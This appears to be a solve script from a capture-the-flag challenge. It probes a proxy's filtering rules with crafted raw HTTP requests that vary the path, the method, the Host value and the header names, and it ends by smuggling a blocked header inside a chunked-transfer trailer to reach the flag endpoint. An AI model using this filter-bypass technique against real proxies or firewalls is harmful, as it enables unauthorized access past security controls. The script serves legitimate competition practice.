#!/usr/bin/env python3
"""
Enumerate the DEPLOYED proxoxy rule set behaviourally, from outside.

The ELF was fingerprinted identical (solve/fingerprint.py) but config.json is
DATA and was inherited from the handout on trust. This probes the rules.

Two-control protocol throughout: every brevski probe runs with `george` and
with `zzz`, because proxoxy answers a rule hit and a parse error identically
with zero bytes. served+served is necessary but NOT sufficient; the `george`
cell must actually contain the flag.

    python3 solve/ruleset.py 127.0.0.1 28888
    python3 solve/ruleset.py <host> <port>
"""
import socket, sys, time

def shoot(host, port, payload, wait=0.55):
    o = b""
    try:
        s = socket.create_connection((host, int(port)), timeout=8)
    except Exception:
        return "CONNFAIL"
    try:
        s.sendall(payload); time.sleep(wait); s.settimeout(1.4)
        try:
            while True:
                d = s.recv(65536)
                if not d: break
                o += d
        except socket.timeout:
            pass
    finally:
        try: s.close()
        except Exception: pass
    if b"TFCCTF" in o or b"fake_flag" in o:
        return "FLAG"
    if not o:
        return "closed"
    return o.split(b"\r\n")[0].decode("latin-1").replace("HTTP/1.1 ", "").replace("HTTP/1.0 ", "")[:24]

def req(method=b"POST", path=b"/flag", host=b"h", hdr=None, body=b""):
    h = method + b" " + path + b" HTTP/1.1\r\nHost: " + host + b"\r\n"
    if hdr: h += hdr
    return h + b"Content-Length: %d\r\n\r\n" % len(body) + body

def pair(host, port, desc, mk):
    g = shoot(host, port, mk(b"george"))
    z = shoot(host, port, mk(b"zzz"))
    note = "FLAG" if g == "FLAG" else ("blocked" if (g == "closed" and z != "closed")
           else ("both closed" if g == "closed" else "NOT blocked"))
    print("  %-40s george=%-12s zzz=%-12s %s" % (desc, g, z, note))

def main():
    host, port = sys.argv[1], sys.argv[2]
    print("== is the brevski rule value-scoped or name-only? ==")
    pair(host, port, "POST /flag  brevski: X", lambda v: req(hdr=b"brevski: " + v + b"\r\n"))
    print("== path scoping ==")
    for p in (b"/flag", b"/health", b"/", b"/random_ahh_game", b"/fl%61g", b"//flag"):
        pair(host, port, "POST %s  brevski: X" % p.decode(),
             lambda v, p=p: req(path=p, hdr=b"brevski: " + v + b"\r\n"))
    print("== method scoping ==")
    for m in (b"GET", b"PUT", b"PLAY", b"DELETE"):
        pair(host, port, "%s /flag  brevski: X" % m.decode(),
             lambda v, m=m: req(method=m, hdr=b"brevski: " + v + b"\r\n"))
    print("== Host scoping ==")
    for hh in (b"localhost", b"evil.example", b"127.0.0.1:8888"):
        pair(host, port, "Host: %s  brevski: X" % hh.decode(),
             lambda v, hh=hh: req(host=hh, hdr=b"brevski: " + v + b"\r\n"))
    print("== other header names: is anything ELSE blocked? ==")
    for n in (b"notbrevski", b"brevskii", b"x-brevski", b"authorization",
              b"x-forwarded-for", b"user-agent", b"cookie", b"referer"):
        pair(host, port, "%s: X" % n.decode(), lambda v, n=n: req(hdr=n + b": " + v + b"\r\n"))
    print("== rule 1 (GET + /flag) ==")
    print("  GET /flag no brevski                     ->",
          shoot(host, port, req(method=b"GET", path=b"/flag")))
    print("  GET /fl%%61g no brevski                   ->",
          shoot(host, port, req(method=b"GET", path=b"/fl%61g")))
    print("== THE PRIMITIVE: brevski in the chunked trailer ==")
    for v in (b"george", b"zzz"):
        p = (b"POST /flag HTTP/1.1\r\nHost: h\r\nTransfer-Encoding: chunked\r\n\r\n"
             b"0\r\nbrevski: " + v + b"\r\n\r\n")
        print("  trailer brevski: %-8s -> %s" % (v.decode(), shoot(host, port, p)))

if __name__ == "__main__":
    main()
